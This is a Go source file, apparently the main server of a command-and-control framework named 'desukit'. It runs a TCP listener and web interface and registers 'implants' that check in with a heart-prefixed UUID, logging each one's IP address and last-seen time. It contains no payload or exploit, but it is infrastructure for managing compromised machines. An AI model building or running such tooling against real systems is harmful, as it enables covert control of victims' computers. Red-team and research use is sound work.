package main

import (
    "fmt"
    "log"
    "net"
    "os"
    "time"
    "unicode/utf8"

    "desukit/asciiArt"
    "desukit/httpui"
    "desukit/sqldb"
    "desukit/sqldb/schema"
    "desukit/sqldb/model"
    "desukit/sqldb/controller/client"
    //"desukit/sqldb/controller/task"

    "github.com/spf13/viper"
)

func main() {
    viper.SetConfigName("config")
    viper.AddConfigPath(".")
    err := viper.ReadInConfig()
    if err != nil {
        log.Println("Error in config file: ", err)
    }

    // Configuration for listener 
    
    CONN_HOST := viper.GetString("listener.host")
    CONN_PORT := viper.GetString("listener.port")
    CONN_TYPE := "tcp"
    

    asciiArt.PrintArt1()

    // ----------- START DB -----------------------
    // database functionality. sqldb makes the database a global variable
    // ConnectDB() only needs to be ran once from main and the db is 
    // accessible anywhere by importing sqldb package like within httpui for example
    sqldb.ConnectDB()
    //schema.InitializeDB() will create the tables if they haven't been created yet
    schema.InitializeDB()

    // listener 
    l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    if err != nil {
        fmt.Println("Encountered Error: ", err.Error())
        os.Exit(1)
    }

    defer l.Close()
    fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)

    // Start webserver for web interface
    go httpui.Start()

    // listener loop
    for {
        conn, err := l.Accept()
        if err != nil {
            fmt.Println("Error", err.Error())
            os.Exit(1)
        }

        go handleRequest(conn)
    }
}

//Listener Handler
func handleRequest(conn net.Conn) {
    defer conn.Close()
    buf := make([]byte, 36)

    req_size, err := conn.Read(buf)
    if err != nil {
        fmt.Println("Error", err.Error())
    }

    uuid := string(buf[:req_size])
    ipaddr := conn.RemoteAddr().String()

    //Data must begin with "♥" character to be accepted by listener in order to filter random incoming data (port scanners)
    checkchar, _ := utf8.DecodeRuneInString("♥")
    checkcharrecv, _ := utf8.DecodeRuneInString(uuid[0:3])

    t := time.Now()
    timestamp := t.Format("15:04:05 01-02-2006")

    //Implant will check in and pickup any tasks if assigned
    if checkchar == checkcharrecv {
        // Remove heart character
        uuid = uuid[3:]
		C := model.Client{uuid, ipaddr, timestamp, timestamp}
        
        // Check for existince in DB
        exists := client.CheckClient(C)
        // Register client into database if it doesn't exist 
        if !exists {
            client.RegisterClient(C)
        } else {
        // Update Timestamp
            client.UpdateClient(C)
        }

        fmt.Printf("\033[2K\rLast Seen: %s [%s] @ %s", C.Uuid, C.Ipaddr, C.Ts_last)

    } 
}
